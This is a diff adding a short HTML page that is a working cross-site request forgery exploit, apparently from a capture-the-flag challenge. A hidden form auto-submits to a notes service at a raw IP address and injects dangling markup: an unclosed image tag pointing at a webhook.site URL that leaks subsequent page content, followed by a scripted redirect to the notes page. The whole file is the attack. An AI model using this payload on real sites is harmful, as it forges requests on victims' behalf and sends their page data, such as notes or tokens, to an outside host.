@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+<body>
+<form id="f" action="http://60.205.163.215:42287/notes/create" method="POST" target="sink">
+  <input type="hidden" name="title" value="pwn">
+  <textarea name="bodyHtml"><meta http-equiv="refresh" content="0;url=/notes"><img src="https://webhook.site/37cad0fb-09de-4fe2-94d7-aae8ff92bf9e?d=</textarea>
+</form>
+
+<iframe name="sink" style="display:none"></iframe>
+
+<script>
+document.getElementById('f').submit();
+setTimeout(() => {
+  location.href = 'http://60.205.163.215:42287/notes';
+}, 1500);
+</script>
+</body>
+</html>
